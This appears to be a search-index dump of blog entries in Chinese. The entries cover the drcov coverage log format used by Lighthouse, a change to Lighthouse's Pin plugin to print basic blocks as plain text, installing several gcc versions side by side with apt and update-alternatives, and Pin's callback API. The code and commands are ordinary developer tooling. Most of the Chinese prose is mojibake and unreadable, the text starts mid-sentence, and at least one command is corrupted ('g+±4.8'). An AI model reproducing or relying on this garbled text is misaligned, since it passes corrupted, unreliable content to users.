¼å¼æœ‰ä¸€ä¸ªåŒ…å«ä¸€äº›metadataçš„å¤´éƒ¨ï¼š DRCOV VERSION: 2 DRCOV FLAVOR: drcov åœ¨Lighthouseä¸­åªæ”¯æŒäº†version 2çš„æ ¼å¼ï¼›DRCOV FLAVORæ˜¯ä¸€ä¸ªæè¿°äº§ç”Ÿè¦†ç›–ç‡ä¿¡æ¯çš„å·¥å…·çš„å­—ç¬¦ä¸²ï¼Œå¹¶æ²¡æœ‰å…·ä½“çš„å®é™…ä½œç”¨ã€‚ ç„¶åï¼Œæ˜¯åœ¨æ”¶é›†è¦†ç›–ç‡ä¿¡æ¯çš„è¿‡ç¨‹ä¸­åŠ è½½çš„æ¨¡å—çš„æ˜ å°„çš„æ¨¡å—è¡¨ï¼š Module Table: version 2, count 39 Columns: id, base, end, entry, checksum, timestamp, path 0, 0x10c83b000, 0x10c83dfff, 0x0000000000000000, 0x00000000, 0x00000000, /Users/ayrx/code/frida-drcov/bar 1, 0x112314000, 0x1123f4fff, 0x0000000000000000, 0x00000000, 0x00000000, /usr/lib/dyld 2, 0x7fff5d866000, 0x7fff5d867fff, 0x0000000000000000, 0x00000000, 0x00000000, /usr/lib/libSystem.B.dylib 3, 0x7fff5dac1000, 0x7fff5db18fff, 0x0000000000000000, 0x00000000, 0x00000000, /usr/lib/libc++.1.dylib 4, 0x7fff5db19000, 0x7fff5db2efff, 0x0000000000000000, 0x00000000, 0x00000000, /usr/lib/libc++abi.dylib 5, 0x7fff5f30d000, 0x7fff5fa93fff, 0x0000000000000000, 0x00000000, 0x00000000, /usr/lib/libobjc.A.dylib 8, 0x7fff60617000, 0x7fff60647fff, 0x0000000000000000, 0x00000000, 0x00000000, /usr/lib/system/libxpc.dylib ... snip ... æ¨¡å—è¡¨çš„å¤´éƒ¨æœ‰ä¸¤ç§å˜ä½“ï¼Œéƒ½åŒ…å«æ¨¡å—è¡¨ä¸­çš„æ¡ç›®æ•°ï¼š Format used in DynamoRIO v6.1.1 through 6.2.0 eg: 'Module Table: 11' Format used in DynamoRIO v7.0.0-RC1 (and hopefully above) eg: 'Module Table: version X, count 11' æ¯ä¸ªç‰ˆæœ¬çš„è¡¨æ ¼æ ¼å¼æœ‰äº›è®¸ä¸åŒï¼š DynamoRIO v6.1.1, table version 1: eg: (Not present) DynamoRIO v7.0.0-RC1, table version 2: Windows: 'Columns: id, base, end, entry, checksum, timestamp, path' Mac/Linux: 'Columns: id, base, end, entry, path' DynamoRIO v7.0.17594B, table version 3: Windows: 'Columns: id, containing_id, start, end, entry, checksum, timestamp, path' Mac/Linux: 'Columns: id, containing_id, start, end, entry, path' DynamoRIO v7.0.17640, table version 4: Windows: 'Columns: id, containing_id, start, end, entry, offset, checksum, timestamp, path' Mac/Linux: 'Columns: id, containing_id, start, end, entry, offset, path' è™½ç„¶æœ‰å¾ˆå¤šåˆ—çš„æ•°å€¼ï¼Œä½†æ˜¯å®é™…ä¸Šèƒ½äºLighthouseäº¤äº’çš„æ•°æ®åªæœ‰ä»¥ä¸‹å‡ ç§ï¼š id: ç”Ÿæˆæ¨¡å—è¡¨æ—¶åˆ†é…çš„åºå·ï¼Œç¨åç”¨äºå°†åŸºæœ¬å—æ˜ å°„åˆ°æ¨¡å—ã€‚ start, base: æ¨¡å—å¼€å§‹çš„å†…å­˜åŸºåœ°å€ã€‚ end: æ¨¡å—ç»“æŸçš„å†…å­˜åœ°å€ã€‚ path: æ¨¡å—åœ¨ç¡¬ç›˜ä¸Šçš„å­˜å‚¨è·¯å¾„ã€‚ æœ€åï¼Œæ—¥å¿—æ–‡ä»¶æœ‰ä¸€ä¸ªåŸºæœ¬å—è¡¨ï¼Œå…¶ä¸­åŒ…å«åœ¨æ”¶é›†è¦†ç›–ä¿¡æ¯æ—¶æ‰§è¡Œçš„åŸºæœ¬å—åˆ—è¡¨ã€‚è™½ç„¶drcovå¯ä»¥ä»¥æ–‡æœ¬æ ¼å¼è½¬å‚¨åŸºæœ¬å—è¡¨ï¼ˆä½¿ç”¨-dump_texté€‰é¡¹ï¼‰ï¼Œä½†å®ƒé»˜è®¤ä»¥äºŒè¿›åˆ¶æ ¼å¼è½¬å‚¨è¡¨ã€‚ BB Table: 861 bbs \u003cbinary data\u003e è¯¥è¡¨é¦–å…ˆæ˜¯ä¸€ä¸ªè¡¨å¤´ï¼Œè¡¨æ˜åŸºæœ¬å—çš„æ•°é‡ã€‚åç»­è·Ÿçš„æ•°æ®æ˜¯ä¸€ä¸ªæ¯ä¸ª8å­—èŠ‚å¤§å°çš„__bb_entry_tç»“æ„ç»„æˆçš„æ•°ç»„ï¼Œ__bb_entry_tçš„ç»“æ„å¦‚ä¸‹ï¼š typedef struct _bb_entry_t { uint start; /* offset of bb start from the image base */ ushort size; ushort mod_id; } bb_entry_t; ç»“æ„è§£é‡Šå¦‚ä¸‹ï¼š start: è·ç¦»åŸºæœ¬å—å…¥å£å¼€å§‹çš„æ¨¡å—çš„åŸºåœ°å€çš„åç§»ã€‚ size: åŸºæœ¬å—çš„å¤§å°ã€‚ mod_id: å‘ç°çš„åŸºæœ¬å—æ‰€åœ¨æ¨¡å—çš„idï¼Œä¸å‰é¢æ¨¡å—è¡¨ä¸­çš„idæ˜¯å¯¹åº”çš„ã€‚ åŸºäºä¸Šé¢3ä¸ªå…ƒç´ ï¼Œå°±å¯ä»¥çŸ¥é“å“ªä¸ªåŸºæœ¬å—è¢«æ‰§è¡Œäº†ï¼Œä»è€Œä½œä¸ºè¦†ç›–ç‡ä¿¡æ¯è¿›è¡Œæ”¶é›†ã€‚ ","date":"2021-10-17","objectID":"/2021/10/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/:4:2","tags":["Fuzz","Instrument","Pin"],"title":"åˆ©ç”¨Lighthouseè¿›è¡Œè¦†ç›–ç‡ç»Ÿè®¡åŠå…¶ä¼˜åŒ–","uri":"/2021/10/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/"},{"categories":["Fuzz"],"content":"3. ä¿®æ”¹è¾“å‡ºæ–¹å¼ä¸ºæ˜æ–‡(ä»¥Pinæ’ä»¶ä¸ºä¾‹) å› ä¸ºLighthouseé»˜è®¤è¾“å‡ºçš„è¦†ç›–ç‡æ—¥å¿—æ–‡ä»¶æ—¶drcovæ ¼å¼çš„ï¼Œäººå·¥é˜…è¯»å­˜åœ¨ä¸€å®šçš„å›°éš¾ã€‚åœ¨æŸäº›åœºæ™¯ä¸‹ï¼Œéœ€è¦ç›´æ¥è·å¾—äººå·¥æ˜“è¯»çš„ä»£ç æ‰§è¡Œè·¯å¾„ä¿¡æ¯ï¼Œæ‰€ä»¥è€ƒè™‘å¯¹Lighthouseçš„è¦†ç›–ç‡ç»Ÿè®¡æ’ä»¶è¿›è¡Œä¿®æ”¹ã€‚ Lighthouseçš„è¦†ç›–ç‡ç»Ÿè®¡åŠŸèƒ½åœ¨å¦‚ä¸‹ä»£ç ä¸­ï¼š # CodeCoverage.cpp static VOID OnFini(INT32 code, VOID* v) { ...snap... drcov_bb tmp; for (const auto\u0026 data : context.m_terminated_threads) { for (const auto\u0026 block : data-\u003em_blocks) { auto address = block.first; auto it = std::find_if(context.m_loaded_images.begin(), context.m_loaded_images.end(), [\u0026address](const LoadedImage\u0026 image) { return address \u003e= image.low_ \u0026\u0026 address \u003c image.high_; }); if (it == context.m_loaded_images.end()) continue; tmp.id = (uint16_t)std::distance(context.m_loaded_images.begin(), it); tmp.start = (uint32_t)(address - it-\u003elow_); tmp.size = data-\u003em_blocks[address]; context.m_trace-\u003ewrite_binary(\u0026tmp, sizeof(tmp)); } } } é¦–å…ˆè®¾ç½®äº†ä¸€ä¸ªdrcov_bbç»“æ„tmpï¼Œå…¶å®Œæ•´æ ¼å¼å¦‚ä¸‹ï¼š struct __attribute__((packed)) drcov_bb { uint32_t start; uint16_t size; uint16_t id; }; ç„¶åè¿›å…¥åˆ°ä¸€ä¸ªå†…å¤–åµŒå¥—å¾ªç¯ä¸­ï¼Œåœ¨æ¯ä¸ªå†…å¾ªç¯ä¸­æ¯è¯»åˆ°ä¸€ä¸ªbbä¿¡æ¯å°±å¯¹tmpç»“æ„è¿›è¡Œèµ‹å€¼ï¼š tmp.id = (uint16_t)std::distance(context.m_loaded_images.begin(), it); tmp.start = (uint32_t)(address - it-\u003elow_); tmp.size = data-\u003em_blocks[address]; æœ€åè°ƒç”¨write_binaryå‡½æ•°å†™å…¥åˆ°traceæ–‡ä»¶ä¸­ï¼š context.m_trace-\u003ewrite_binary(\u0026tmp, sizeof(tmp)); è€Œwrite_binaryå‡½æ•°çš„å®ç°åœ¨Trace.hæ–‡ä»¶ä¸­ï¼š void write_binary(const void* ptr, size_t size) { if (fwrite(ptr, size, 1, m_file) != 1) { std::cerr \u003c\u003c \"Could not log to the log file.\" \u003c\u003c std::endl; std::abort(); } } å¯ä»¥çœ‹åˆ°æœ¬è´¨ä¸Šå°±æ˜¯è°ƒç”¨fwriteå‡½æ•°è¿›è¡Œæµæ“ä½œã€‚æ­¤å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªwrite_stringå‡½æ•°ï¼š void write_string(const char* format, ...) { va_list args; va_start(args, format); if (vfprintf(m_file, format, args) \u003c 0) { std::cerr \u003c\u003c \"Could not log to the log file.\" \u003c\u003c std::endl; std::abort(); } va_end(args); } è¯¥å‡½æ•°ç”¨ä½œæƒ³traceæ–‡ä»¶ä¸­å†™å…¥stringæ ¼å¼çš„æ•°æ®ã€‚è¿™ä¹ˆä¸€æ¥å°±å¥½åŠäº†ï¼Œç›´æ¥ç”¨ç°æˆçš„å³å¯ï¼Œåªéœ€è¦ä¿®æ”¹åœ¨å†™æ–‡ä»¶æ—¶çš„æ“ä½œå°±okäº†ã€‚ä¿®æ”¹åçš„ä»£ç å¦‚ä¸‹ï¼š // drcov_bb tmp; è¿™é‡Œè¦æ³¨é‡Šæ‰ã€‚å¦åˆ™æœ‰çš„ç¯å¢ƒä¼šæŠ¥ç¼–è¯‘ä¸é€šè¿‡ for (const auto\u0026 data : context.m_terminated_threads) { for (const auto\u0026 block : data-\u003em_blocks) { auto address = block.first; auto it = std::find_if(context.m_loaded_images.begin(), context.m_loaded_images.end(), [\u0026address](const LoadedImage\u0026 image) { return address \u003e= image.low_ \u0026\u0026 address \u003c image.high_; }); if (it == context.m_loaded_images.end()) continue; uint16_t id = (uint16_t)std::distance(context.m_loaded_images.begin(), it); uint32_t start_addr = (uint32_t)(address - it-\u003elow_); int size = data-\u003em_blocks[address]; context.m_trace-\u003ewrite_string(\"[+]module: [%d] 0x%08x %d\\n\", id, start_addr, size); } } è¿™ç§æ ¼å¼åªèƒ½ç”¨ä½œäººå·¥é˜…è¯»æˆ–è¿›ä¸€æ­¥çš„å¤„ç†ï¼Œæ²¡æœ‰åŠæ³•å†ä½¿ç”¨drcov2lcovå’Œgenhtmlå·¥å…·è¿›è¡Œè½¬æ¢äº†ï¼Œæœ€ç»ˆå®ç°çš„æ•ˆæœå¦‚ä¸‹ï¼š ä¼šä»¥æ˜æ–‡å½¢å¼æ‰“å°å‡ºæ¯ä¸ªæ¨¡å—çš„æ‰§è¡Œçš„åŸºæœ¬å—çš„åœ°å€å’Œå—å¤§å°ï¼Œè¿™æ ·å°±æ–¹ä¾¿äººå·¥è¿›è¡Œé˜…è¯»ï¼Œè¿˜å¯ä»¥è¿›ä¸€æ­¥æå–å‡ºæ¨¡å—æ‰§è¡Œçš„åœ°å€ï¼Œè¿›è¡Œåç»­å¤„ç†ã€‚ ","date":"2021-10-17","objectID":"/2021/10/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/:5:0","tags":["Fuzz","Instrument","Pin"],"title":"åˆ©ç”¨Lighthouseè¿›è¡Œè¦†ç›–ç‡ç»Ÿè®¡åŠå…¶ä¼˜åŒ–","uri":"/2021/10/%E5%88%A9%E7%94%A8lighthouse%E8%BF%9B%E8%A1%8C%E8%A6%86%E7%9B%96%E7%8E%87%E7%BB%9F%E8%AE%A1%E5%8F%8A%E5%85%B6%E4%BC%98%E5%8C%96/"},{"categories":["LINUX"],"content":"è®°å½•ä¸€ä¸‹å¤šç‰ˆæœ¬gccå…±å­˜çš„è§£å†³æ–¹æ¡ˆã€‚","date":"2021-10-07","objectID":"/2021/10/%E5%A4%9A%E7%89%88%E6%9C%ACgcc%E5%85%B1%E5%AD%98%E6%96%B9%E6%A1%88/","tags":["LINUX","gcc"],"title":"å¤šç‰ˆæœ¬gccå…±å­˜æ–¹æ¡ˆ","uri":"/2021/10/%E5%A4%9A%E7%89%88%E6%9C%ACgcc%E5%85%B1%E5%AD%98%E6%96%B9%E6%A1%88/"},{"categories":["LINUX"],"content":"å‰è¨€ æœ‰æ—¶éœ€è¦è¿›è¡Œäº¤å‰ç¼–è¯‘çš„æ—¶å€™ï¼Œå¯èƒ½éœ€è¦åœ¨é«˜ç‰ˆæœ¬çš„æ¶æ„ä¸Šç¼–è¯‘ä¸€ä¸ªä½ç‰ˆæœ¬çš„å·¥å…·æ¥è¿è¡Œåˆ°ä¸€ä¸ªæ—§å¹³å°ä¸Šã€‚é«˜ç‰ˆæœ¬çš„æ¶æ„ä¸€èˆ¬è‡ªå¸¦çš„éƒ½æ˜¯é«˜ç‰ˆæœ¬å·¥å…·ï¼Œè¿™æ ·ç¼–è¯‘å‡ºæ¥çš„å·¥å…·æ— æ³•åœ¨ä½ç‰ˆæœ¬æ¶æ„ä¸Šè¿è¡Œï¼Œæ‰€ä»¥å°±æœ‰äº†å¤šç‰ˆæœ¬ç¼–è¯‘å™¨å…±å­˜çš„æƒ…å†µã€‚è¿™é‡Œæˆ‘ä»¬ä»¥ gcc ä¸ºä¾‹ç®€å•è¯´ä¸€ä¸‹å¤šç‰ˆæœ¬ gcc å…±å­˜çš„è§£å†³æ–¹æ¡ˆï¼Œå…¶å®å¾ˆç®€å•ã€‚ ","date":"2021-10-07","objectID":"/2021/10/%E5%A4%9A%E7%89%88%E6%9C%ACgcc%E5%85%B1%E5%AD%98%E6%96%B9%E6%A1%88/:1:0","tags":["LINUX","gcc"],"title":"å¤šç‰ˆæœ¬gccå…±å­˜æ–¹æ¡ˆ","uri":"/2021/10/%E5%A4%9A%E7%89%88%E6%9C%ACgcc%E5%85%B1%E5%AD%98%E6%96%B9%E6%A1%88/"},{"categories":["LINUX"],"content":"å®‰è£…ä½ç‰ˆæœ¬gcc/g++ åœ¨é«˜ç‰ˆæœ¬çš„ Linux ä¸Šçš„æºé‡Œæ˜¯ä¸èƒ½ç›´æ¥ apt å»å®‰è£…ä½ç‰ˆæœ¬çš„ gcc/g++ çš„ï¼Œæ‰€ä»¥è¿™é‡Œç®€å•è®°å½•ä¸‹å¦‚ä½•åœ¨é«˜ç‰ˆæœ¬çš„ Ubuntu ä¸Šä¹Ÿå¯ä»¥ç›´æ¥ apt å®‰è£…ã€‚ æ¢æº æ—¢ç„¶é«˜ç‰ˆæœ¬çš„æºé‡Œæ²¡æœ‰å®‰è£…åŒ…ï¼Œç›´æ¥æ›´æ–°ä¸€ä¸‹ä½ç‰ˆæœ¬çš„æºå¥½äº†ã€‚ä»¥ gcc-4.8 ä¸ºä¾‹ï¼Œè¿™é‡Œé¦–å…ˆæŠŠ ubuntu 16.04 çš„æºæ›´æ–°åˆ° /etc/apt/sources.listä¸­å»ï¼š # official deb http://dk.archive.ubuntu.com/ubuntu/ xenial main deb http://dk.archive.ubuntu.com/ubuntu/ xenial universe # å›½å†…æºaliyun deb http://mirrors.aliyun.com/ubuntu/ xenial main deb-src http://mirrors.aliyun.com/ubuntu/ xenial main deb http://mirrors.aliyun.com/ubuntu/ xenial-updates main deb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main deb http://mirrors.aliyun.com/ubuntu/ xenial universe deb-src http://mirrors.aliyun.com/ubuntu/ xenial universe deb http://mirrors.aliyun.com/ubuntu/ xenial-updates universe deb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates universe deb http://mirrors.aliyun.com/ubuntu/ xenial-security main deb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main deb http://mirrors.aliyun.com/ubuntu/ xenial-security universe deb-src http://mirrors.aliyun.com/ubuntu/ xenial-security universe ç„¶å sudo apt update ä¸€ä¸‹ï¼ŒæŠŠåŒ…èµ„æºæ›´æ–°è¿›æ¥ã€‚ å®‰è£… å¯ä»¥å…ˆæŸ¥çœ‹ä¸€ä¸‹ç‰ˆæœ¬ä¿¡æ¯ï¼šsudo apt-cache policy gcc-4.8 ï¼Œä½œç”¨ç±»ä¼¼äºæœç´¢ï¼Œä¸‹é¢æ‰€æœ‰èƒ½å®‰è£…çš„å­ç‰ˆæœ¬éƒ½ä¼šåˆ—å‡ºæ¥ã€‚ç„¶åç›´æ¥ apt install å¯¹åº”çš„ç‰ˆæœ¬å³å¯ã€‚ è¿™ç§æ–¹æ³•ä¸ç®¡æƒ³å®‰è£…ä»€ä¹ˆç‰ˆæœ¬çš„æ—§è½¯ä»¶ï¼Œåªè¦æœ‰å¯¹åº”çš„æ›´æ–°æºå³å¯ã€‚ ","date":"2021-10-07","objectID":"/2021/10/%E5%A4%9A%E7%89%88%E6%9C%ACgcc%E5%85%B1%E5%AD%98%E6%96%B9%E6%A1%88/:2:0","tags":["LINUX","gcc"],"title":"å¤šç‰ˆæœ¬gccå…±å­˜æ–¹æ¡ˆ","uri":"/2021/10/%E5%A4%9A%E7%89%88%E6%9C%ACgcc%E5%85%B1%E5%AD%98%E6%96%B9%E6%A1%88/"},{"categories":["LINUX"],"content":"ç‰ˆæœ¬æ§åˆ¶ ç¬¬ä¸€ç§æ–¹æ³•ï¼š ç›´æ¥åœ¨ä½¿ç”¨æ—¶æŒ‡å®š CC æˆ– CXXï¼Œè·Ÿä¸Šå¯¹åº”ç‰ˆæœ¬çš„ gcc/g++ çš„ç»å¯¹è·¯å¾„å³å¯ã€‚ä¸ªäººæ„Ÿè§‰è¿™æ ·ä¼šæ›´æ–¹ä¾¿ä¸€ç‚¹ï¼Œåªè¦åœ¨ç¼–è¯‘çš„æ—¶å€™æŒ‡å®šä¸€ä¸‹å˜é‡å³å¯ã€‚ ç¬¬äºŒç§æ–¹æ³•ï¼š è®¾ç½®ä¼˜å…ˆçº§ï¼š $ sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-4.8 40 $ sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-9 90 $ sudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++4.8 40 $ sudo update-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-9 90 # æ•°å­—è¶Šå¤§ï¼Œè¡¨ç¤ºä¼˜å…ˆçº§è¶Šé«˜ï¼Œä¸Šé¢çš„ä¾‹å­ä¸­å°±æ˜¯ä¼˜å…ˆä½¿ç”¨ gcc-9 ï¼Œè¿™ä¸ªå…·ä½“çš„æ•°å­—ä¸ç”¨ç‰¹åˆ«å…³æ³¨ï¼Œåªè¦èƒ½ä½“ç°å‡ºæ¥å¤§å°æ¥è¡¨è¾¾ä¼˜å…ˆçº§å°±å¯ä»¥ã€‚ åˆ é™¤è®¾ç½®çš„ä¼˜å…ˆçº§ï¼š $ sudo update-alternatives --remove /usr/bin/g+Â±4.8 åˆ‡æ¢ç‰ˆæœ¬å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤ï¼š $ sudo update-alternatives --config gcc $ sudo update-alternatives --config g++ é€‰æ‹©å¯¹åº”çš„æ•°å­—å³å¯ï¼Œç„¶åå›è½¦å³å¯åˆ‡æ¢ç‰ˆæœ¬ã€‚ ","date":"2021-10-07","objectID":"/2021/10/%E5%A4%9A%E7%89%88%E6%9C%ACgcc%E5%85%B1%E5%AD%98%E6%96%B9%E6%A1%88/:3:0","tags":["LINUX","gcc"],"title":"å¤šç‰ˆæœ¬gccå…±å­˜æ–¹æ¡ˆ","uri":"/2021/10/%E5%A4%9A%E7%89%88%E6%9C%ACgcc%E5%85%B1%E5%AD%98%E6%96%B9%E6%A1%88/"},{"categories":["Fuzz"],"content":"Pinå­¦ä¹ è®°å½•ç¬¬äºŒç¯‡","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"æœ¬æ–‡æ˜¯Pinç³»åˆ—å­¦ä¹ è®°å½•çš„ç¬¬äºŒç¯‡ï¼Œä¸»è¦æ˜¯å®˜æ–¹æ–‡æ¡£çš„ç›¸å…³å†…å®¹çš„æ•´ç†æ€»ç»“ã€‚ ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:0:0","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"4. Callbacks è¿™éƒ¨åˆ†ä¸»è¦ä»‹ç»å‡ ä¸ªPinçš„ç”¨äºæ³¨å†Œå›è°ƒå‡½æ•°çš„APIï¼š INS_AddInstrumentFunction (INSCALLBACK fun, VOID *val)ï¼šæ³¨å†Œä»¥æŒ‡ä»¤ç²’åº¦æ’æ¡©çš„å‡½æ•° TRACE_AddInstrumentFunction (TRACECALLBACK fun, VOID *val)ï¼šæ³¨å†Œä»¥traceç²’åº¦æ’æ¡©çš„å‡½æ•° RTN_AddInstrumentFunction (RTNCALLBACK fun, VOID *val)ï¼šæ³¨å†Œä»¥routineç²’åº¦æ’æ¡©çš„å‡½æ•° IMG_AddInstrumentFunction (IMGCALLBACK fun, VOID *val)ï¼šæ³¨å†Œä»¥imageç²’åº¦æ’æ¡©çš„å‡½æ•° PIN_AddFiniFunction (FINICALLBACK fun, VOID *val)ï¼šæ³¨å†Œåœ¨åº”ç”¨ç¨‹åºé€€å‡ºå‰æ‰§è¡Œçš„å‡½æ•°ï¼Œè¯¥ç±»å‡½æ•°ä¸è¿›è¡Œæ’æ¡©ï¼Œå¯ä»¥æœ‰å¤šä¸ªã€‚ PIN_AddDetachFunction (DETACHCALLBACK fun, VOID *val)ï¼šæ³¨å†Œåœ¨Piné€šè¿‡PIN_Detach()å‡½æ•°æ”¾å¼ƒå¯¹åº”ç”¨ç¨‹åºçš„æ§åˆ¶æƒé™ä¹‹å‰æ‰§è¡Œçš„å‡½æ•°ï¼Œä¸€ä¸ªè¿›ç¨‹åªè°ƒç”¨ä¸€æ¬¡ï¼Œå¯ä»¥è¢«ä»»ä½•çº¿ç¨‹è°ƒç”¨ï¼Œæ­¤æ—¶Pinçš„å†…å­˜å¹¶æ²¡æœ‰é‡Šæ”¾ã€‚ å¯¹äºæ¯ä¸ªæ³¨å†Œå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°valå°†åœ¨â€œå›è°ƒâ€æ—¶ä¼ é€’ç»™å›è°ƒå‡½æ•°ã€‚å¦‚æœåœ¨å®é™…çš„åœºæ™¯ä¸­ä¸éœ€è¦ä¼ é€’ç¬¬äºŒä¸ªå‚æ•°ï¼Œä¸ºäº†ä¿è¯å®‰å…¨ï¼Œå¯ä»¥ä¼ é€’å°†valçš„å€¼è®¾ç½®ä¸º0è¿›è¡Œä¼ é€’ã€‚valçš„ç†æƒ³ä½¿ç”¨æ–¹å¼æ˜¯ä¼ é€’ä¸€ä¸ªæŒ‡å‘ç±»å®ä¾‹çš„æŒ‡é’ˆï¼Œè¿™æ ·å›è°ƒå‡½æ•°åœ¨å–æ¶ˆå¼•ç”¨è¯¥æŒ‡é’ˆå‰éœ€è¦å°†å…¶è½¬æ¢å›ä¸€ä¸ªå¯¹è±¡ã€‚ æ‰€æœ‰çš„æ³¨å†Œå‡½æ•°éƒ½ä¼šè¿”å›ä¸€ä¸ªPIN_CALLBACKå¯¹è±¡ï¼Œè¯¥å¯¹è±¡å¯ä»¥åœ¨åç»­è¿‡ç¨‹ä¸­ç”¨äºæ“ä½œæ³¨å†Œçš„å›è°ƒçš„ç›¸å…³å±æ€§ã€‚ ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:1:0","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"PIN callbacks manipulation API åœ¨æ³¨å†Œå‡½æ•°è¿”å›PIN_CALLBACKå¯¹è±¡åï¼Œå¯ä»¥ä½¿ç”¨PIN_CALLBACKAPIå¯¹å…¶è¿›è¡Œæ“ä½œï¼Œæ¥æ£€ç´¢å’Œä¿®æ”¹åœ¨Pinä¸­å·²æ³¨å†Œçš„å›è°ƒå‡½æ•°çš„å±æ€§ã€‚ å£°æ˜ï¼š typedef COMPLEX_CALLBACKVAL_BASE * PIN_CALLBACK å‡½æ•°ï¼š CALLBACK_GetExecutionOrder() å£°æ˜ï¼š VOID CALLBACK_GetExecutionOrder (PIN_CALLBACK callback) ä½œç”¨ï¼šè·å–å·²æ³¨å†Œå›è°ƒå‡½æ•°çš„æ‰§è¡Œé¡ºåºã€‚è¶Šé å‰ï¼Œè¶Šæ—©è¢«æ‰§è¡Œã€‚ å‚æ•°ï¼šcallbackï¼Œä»*_Add*Funcxtion()å‡½æ•°è¿”å›çš„æ³¨å†Œçš„å›è°ƒå‡½æ•° CALLBACK_SetExecutionOrder() å£°æ˜ï¼š VOID CALLBACK_SetExecutionOrder (PIN_CALLBACK callback, CALL_ORDER order) ä½œç”¨ï¼šè®¾ç½®å·²æ³¨å†Œå›è°ƒå‡½æ•°çš„æ‰§è¡Œé¡ºåºã€‚è¶Šé å‰ï¼Œè¶Šæ—©è¢«æ‰§è¡Œã€‚ å‚æ•°ï¼šcallbackï¼Œä»*_Add*Funcxtion()å‡½æ•°è¿”å›çš„æ³¨å†Œçš„å›è°ƒå‡½æ•°ï¼›orderï¼Œæ–°è®¾ç½®çš„å›è°ƒå‡½æ•°çš„æ‰§è¡Œé¡ºåºã€‚ PIN_CALLBACK_INVALID() å£°æ˜ï¼š const PIN_CALLBACK PIN_CALLBACK_INVALID(0) PINå›è°ƒçš„æ— æ•ˆå€¼ã€‚ ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:1:1","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"CALL_ORDER CALL_ORDERæ˜¯ä¸€ä¸ªæšä¸¾ç±»å‹ï¼Œé¢„å®šä¹‰äº†IARG_CALL_ORDERçš„å€¼ã€‚å…¶ä½œç”¨å°±æ˜¯å½“æŒ‡ä»¤æœ‰å¤šä¸ªåˆ†æå‡½æ•°è°ƒç”¨æ—¶ï¼Œæ§åˆ¶æ¯ä¸ªåˆ†æå‡½æ•°çš„è°ƒç”¨é¡ºåºï¼Œé»˜è®¤å€¼ä¸ºCALL_ORDER_DEFAULTã€‚ CALL_ORDER_FIRSTï¼šé¦–å…ˆæ‰§è¡Œè¯¥è°ƒç”¨ï¼Œæ•´æ•°å€¼ä¸º100. CALL_ORDER_DEFAULTï¼šæœªæŒ‡å®šIARG_CALL_ORDERæ—¶çš„é»˜è®¤å€¼ï¼Œæ•´æ•°å€¼ä¸º200. CALL_ORDER_LASTï¼šæœ€åæ‰§è¡Œè¯¥è°ƒç”¨ï¼Œæ•´æ•°å€¼ä¸º300. åœ¨è¿›è¡Œæ•°å€¼è®¾å®šæ—¶ï¼Œå¯ä»¥ä½¿ç”¨ç±»ä¼¼CALL_ORDER_DEFAULT + 5çš„æ ¼å¼æ¥è®¾ç½®ã€‚ é’ˆå¯¹åœ¨ç›¸åŒæ’æ¡©å›è°ƒç¯å¢ƒä¸­çš„é’ˆå¯¹åŒä¸€æŒ‡ä»¤çš„ã€å…·å¤‡åŒæ ·CALL_ORDERçš„å¤šä¸ªåˆ†æè°ƒç”¨ï¼ŒPinä¼šæŒ‰ç…§æ’å…¥çš„é¡ºåºè¿›è¡Œè°ƒç”¨ã€‚ ","date":"2021-10-07","objectID":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/:1:2","tags":["Fuzz","Instrument","Pin"],"title":"æœ‰æ¯’çš„å­¦Pinè®°å½• -- 2","uri":"/2021/10/%E6%9C%89%E6%AF%92%E7%9A%84%E5%AD%A6pin%E8%AE%B0%E5%BD%95--2/"},{"categories":["Fuzz"],"content":"5. Mopdifying 